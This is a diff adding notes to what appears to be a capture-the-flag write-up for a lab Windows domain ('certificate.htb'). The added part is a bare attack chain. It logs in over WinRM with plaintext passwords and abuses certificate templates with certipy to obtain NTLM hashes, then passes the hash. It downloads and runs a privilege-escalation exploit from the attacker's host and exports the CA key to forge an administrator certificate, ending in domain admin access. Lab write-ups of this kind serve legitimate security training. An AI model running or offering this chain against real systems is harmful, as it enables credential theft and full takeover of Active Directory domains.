@@ -98,3 +98,30 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 95.35 seconds
 ```
+
+to be updated:
+
+```sh
+evil-winrm -i 10.10.11.71 -u Sara.B -p Blink182
+
+evil-winrm -i 10.10.11.71 -u Lion.SK -p '!QAZ2wsx'
+
+certipy-ad req -u Lion.SK@certificate.htb -p '!QAZ2wsx' -dc-ip 10.10.11.71 -target dc01.certificate.htb -ca Certificate-LTD-CA -template Delegated-CRA
+certipy-ad req -u Lion.SK@certificate.htb -p '!QAZ2wsx' -dc-ip 10.10.11.71 -target dc01.certificate.htb -ca Certificate-LTD-CA -template SignedUser -pfx lion.sk.pfx -on-behalf-of 'CERTIFICATE\Ryan.k'
+apt update && apt -y install ntpsec-ntpdate
+ntpdate -q dc01.certificate.htb
+timedatectl set-ntp 0
+ntpdate dc01.certificate.htb
+certipy-ad auth -pfx ryan.k.pfx -dc-ip 10.10.11.71
+[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
+evil-winrm -i 10.10.11.71 -u Ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6
+
+curl 10.10.14.6/SeManageVolumeExploit.exe -O SeManageVolumeExploit.exe
+.\SeManageVolumeExploit.exe
+certutil -exportPFX my "Certificate-LTD-CA" ca.pfx
+download ca.pfx
+certipy-ad forge -ca-pfx ca.pfx -upn administrator@certificate.htb -out admin.pfx
+certipy-ad auth -pfx admin.pfx -dc-ip 10.10.11.71
+[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
+evil-winrm -i 10.10.11.71 -u administrator -H d804304519bf0143c14cbf1c024408c6
+```
